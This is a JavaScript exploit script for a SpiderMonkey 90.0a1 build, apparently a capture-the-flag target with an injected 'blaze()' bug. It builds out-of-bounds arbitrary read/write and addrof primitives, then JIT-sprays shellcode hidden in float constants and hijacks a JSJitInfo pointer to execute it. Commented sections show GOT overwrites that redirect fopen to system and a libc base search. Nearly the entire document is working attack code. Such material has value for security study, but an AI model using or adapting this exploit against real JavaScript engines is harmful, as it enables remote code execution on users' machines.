// Exploit by @ulexec for SpiderMonkey JavaScript-C90.0a1 - 23-04-2021

load('utils.js');
load('int64.js');
load('resolver.js');
 
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function arb_write(addr, value) {
	x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
	y = new Uint8Array(8);
	x.blaze();
	save = x[13];
	x[13] = itof(addr)
	y[0] = Number(value);
	x[13] = save;
}

function arb_w8(addr, value) {
	var i;
	value = BigInt(value);
	for (i = 0; i < 8; i ++) {
		v = BigInt(value & 0xffn);
		arb_write(addr, v);
		value = value >> 8n;
		addr += 1n;
	}
}

function arb_read(addr, size) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();

	a1[13] = itof(addr)
	return a2.slice(0, size);
}

function arb_r1(addr) {
	v0 = arb_read(addr);
	return Number(v0[0]);
}

function arb_r2(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n);
	return pointer;
}

function arb_r4(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n) + (BigInt(v0[2]) << 16n) + (BigInt(v0[3]) << 24n);
	return pointer;
}

function arb_r8(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n) + (BigInt(v0[2]) << 16n) + (BigInt(v0[3]) << 24n) + (BigInt(v0[4]) << 32n) + (BigInt(v0[5]) << 40n);
	return pointer;
}

function addrof(obj) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();	
	a1[14] = obj;
	return a2.slice(0, 8);
}


/* Additional Exploitation avenues. Most of them feasible for Partial RELRO
 
var x1 = new Array(1, 2, 3, 4);
var x2 = new Uint8Array(8);
x1.blaze();

// Leaking main image base
// This offset should be constant for each patch level
let code_base = ftoi(x1[8]) - 0x110f6c8n;
console.log("[+] ELF image_base leaked:\t0x"+code_base.toString(16));
// JS resolver to get main image R_X86_64_JUMP_SLOT based symbols
let image_syms = resolve_symbols(code_base, R_X86_64_JUMP_SLOT);

// With Partial RELRO this should be enough to pop a shell
let got_system = image_syms['system'];
let got_fopen = image_syms['fopen'];
let libc_system = arb_r8(got_system);
console.log("[+] GOT system at:\t\t0x"+got_system.toString(16));
console.log("[+] libc system at:\t\t0x"+libc_system.toString(16));
arb_w8(got_fopen, libc_system);
load("/usr/bin/xcalc");
// Also this  RELRO this may just work
arb_write(image_syms["gettimeofday"], one_gadget);
Date.now();
*/

/* Resolving LIBC base from the first GOT entry of the main image
let first_got_entry_addr = image_syms["__cxa_finalize"];
let first_got_entry = arb_r8(first_got_entry_addr);
console.log("[+] first GOT entry addr:\t0x"+first_got_entry_addr.toString(16));

var libc_base = 0;
var libc_header = 0;
var delta = BigInt(0x1000 * 65);
first_got_entry_delta = first_got_entry % Math.pow(2,8);
first_got_entry = BigInt(first_got_entry - first_got_entry_delta);
console.log("[+] Attempting to find libc base");
console.log("\t- Starting from address: 0x" + (first_got_entry).toString(16));
for (var x=0; x < 10; x++) {
	delta = delta + 0x1000n;
	libc_header = arb_r8(first_got_entry-delta);	
	if (Int64.fromJSValue(libc_header) == 0x102464c457f) {
		libc_base = BigInt(first_got_entry-delta);
		break;
	}
}

if (libc_base == 0) {
	console.log("[-] Failed to leak libc");
}
console.log("[+] libc base leaked:\t0x"+libc_base.toString(16));

// Resolving LIBC symbols
let libc_syms = resolve_symbols(libc_base, R_X86_64_GLOB_DAT);
console.log("[+] libc __malloc_hook: 0x"+libc_syms["__malloc_hook"].toString(16));
one_gadget = new Int64((libc_base + 0xe6c7en).toString(16));
Math.atan2(x1);

// TODO: I havent figured out yet how to exploit libc's symbols, but surely there is a way.
// this doesnt work arb_write(libc_syms["__malloc_hook"], one_gadget);
*/

// RELRO Exploitaion with JIT engine
// Use constants to JIT shellcode
function shellcode(){
	find_me = 5.40900888e-315; // 0x41414141 flag in memory
	A = -6.828527034422786e-229;
	B = 8.568532312320605e+170;
	C = 1.4813365150669252e+248;
	D = -6.032447120847604e-264;
	E = -6.0391189260385385e-264;
	F = 1.0842822352493598e-25;
	G = 9.241363425014362e+44;
	H = 2.2104256869204514e+40;
	I = 2.4929675059396527e+40;
	J = 3.2459699498717e-310;
	K = 1.637926e-318;
}

// Searches from the JIT memory region to find the shellcode's flag 0x41414141
function find_shellcode_addr(addr) {
	while(true) { 
		let val = arb_r4(addr); 
		if(val == 0x41414141n) {
			addr = addr + 8n;
			return addr;
		}
		addr = addr + 1n;
	}
}

// JIT shellcode function
for(i=0;i<0x10000;i++) shellcode();

// Get Shellcode address
let shellcode_object = BigInt(Int64.fromJSValue(addrof(shellcode)));
console.log("[+] shellcode Object :\t\t0x"+shellcode_object.toString(16));
let shellcode_jitinfo_ptr = arb_r8(shellcode_object+0x28n);
console.log("[+] shellcode JSJitInfo ptr:\t0x"+shellcode_jitinfo_ptr.toString(16));
let shellcode_jitinfo = arb_r8(shellcode_jitinfo_ptr);
console.log("[+] shellcode JSJitInfo:\t0x"+shellcode_jitinfo.toString(16));
let shellcode_entry = find_shellcode_addr(shellcode_jitinfo);
console.log("[+] shellcode entry:\t\t0x"+shellcode_entry.toString(16));
arb_w8(shellcode_jitinfo_ptr, shellcode_entry);
// This is for debuging purposes
Math.atan2(shellcode);
// Shellcode will call JSJitInfo ptr which we have overwritten
shellcode();

